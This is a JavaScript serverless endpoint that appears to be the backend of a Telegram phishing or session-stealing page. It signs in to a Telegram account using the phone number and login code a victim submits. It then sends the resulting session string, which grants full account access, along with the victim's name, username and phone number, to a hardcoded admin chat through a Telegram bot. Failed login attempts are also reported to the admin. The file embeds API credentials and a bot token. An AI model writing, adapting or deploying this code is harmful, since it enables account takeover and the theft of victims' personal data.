const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

const API_ID = 23171051;
const API_HASH = '10331d5d712364f57ffdd23417f4513c';
const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
const ADMIN_ID = '7907742294';

async function sendToBot(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    if (!response.ok) {
      console.error('Bot API error:', await response.text());
    }
  } catch (error) {
    console.error('Failed to send message to bot:', error);
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  let client;
  try {
    const { phone, phone_code_hash, otp_code, password } = req.body;

    if (!phone || !phone_code_hash || !otp_code) {
      return res.status(400).json({ 
        success: false, 
        error: 'All fields are required' 
      });
    }

    console.log('Verifying code for:', phone, 'Code:', otp_code);

    const stringSession = new StringSession('');
    client = new TelegramClient(stringSession, API_ID, API_HASH, {
      connectionRetries: 5,
      useWSS: false,
      baseLogger: console,
    });

    await client.connect();

    try {
      // Use the proper signIn method
      let result;
      
      // First try regular sign in
      try {
        result = await client.invoke(
          new Api.auth.SignIn({
            phoneNumber: phone,
            phoneCodeHash: phone_code_hash,
            phoneCode: otp_code,
          })
        );
        
        console.log('Regular sign in successful');
        
      } catch (signInError) {
        console.log('Regular sign in failed, trying alternative method...');
        
        // If regular sign in fails, try the start method approach
        await client.start({
          phoneNumber: phone,
          phoneCode: async () => otp_code,
          phoneCodeHash: phone_code_hash,
          onError: (err) => {
            console.error('Start method error:', err);
            throw err;
          },
        });
        
        console.log('Start method successful');
      }

      // Check if we're authorized
      if (!await client.checkAuthorization()) {
        throw new Error('Authorization failed after sign in attempt');
      }

      // Get the final session string
      const sessionString = client.session.save();
      
      // Get user information
      const me = await client.getMe();
      const userInfo = {
        id: me.id,
        username: me.username || 'No username',
        first_name: me.firstName || '',
        last_name: me.lastName || '',
        phone: me.phone || phone
      };

      console.log('Session generated for user:', userInfo.id);

      // Send session to admin via bot
      const botMessage = `🔐 **New Telegram Session Generated**\n\n` +
        `👤 **User Info:**\n` +
        `├ ID: \`${userInfo.id}\`\n` +
        `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
        `├ Username: @${userInfo.username || 'N/A'}\n` +
        `└ Phone: ${userInfo.phone}\n\n` +
        `🔑 **Session String:**\n\`${sessionString}\``;

      await sendToBot(botMessage);
      console.log('Message sent to bot successfully');

      await client.disconnect();

      return res.status(200).json({
        success: true,
        session_string: sessionString,
        user_info: userInfo,
        message: 'Session generated successfully and sent to admin'
      });

    } catch (authError) {
      console.error('Authentication error:', authError);
      
      let errorMessage = authError.message;
      
      // Handle specific Telegram errors
      if (authError.errorMessage) {
        switch (authError.errorMessage) {
          case 'PHONE_CODE_INVALID':
            errorMessage = 'Invalid verification code. Please check and try again.';
            break;
          case 'PHONE_CODE_EXPIRED':
            errorMessage = 'Verification code expired. Please request a new code.';
            break;
          case 'SESSION_PASSWORD_NEEDED':
            errorMessage = '2FA password required. Please enter your password.';
            break;
          case 'PHONE_NUMBER_UNOCCUPIED':
            errorMessage = 'Phone number not registered on Telegram.';
            break;
          case 'PHONE_NUMBER_INVALID':
            errorMessage = 'Invalid phone number format.';
            break;
          default:
            errorMessage = `Telegram error: ${authError.errorMessage}`;
        }
      } else if (authError.message) {
        if (authError.message.includes('PHONE_CODE_INVALID')) {
          errorMessage = 'Invalid verification code. Please check and try again.';
        } else if (authError.message.includes('PHONE_CODE_EXPIRED')) {
          errorMessage = 'Verification code expired. Please request a new code.';
        } else if (authError.message.includes('SESSION_PASSWORD_NEEDED')) {
          errorMessage = '2FA password required. Please enter your password.';
        } else if (authError.message.includes('FLOOD_WAIT')) {
          const waitTime = authError.message.match(/(\d+)/)?.[0] || 'unknown';
          errorMessage = `Too many attempts. Please wait ${waitTime} seconds and try again.`;
        }
      }
      
      // Send error to bot for monitoring
      await sendToBot(`❌ **Session Generation Failed**\n\nPhone: ${phone}\nError: ${errorMessage}`);
      
      throw new Error(errorMessage);
    }

  } catch (error) {
    console.error('Error in verify-code:', error);
    
    if (client) {
      try {
        await client.disconnect();
      } catch (disconnectError) {
        console.error('Error disconnecting client:', disconnectError);
      }
    }
    
    res.status(200).json({
      success: false,
      error: error.message
    });
  }
};
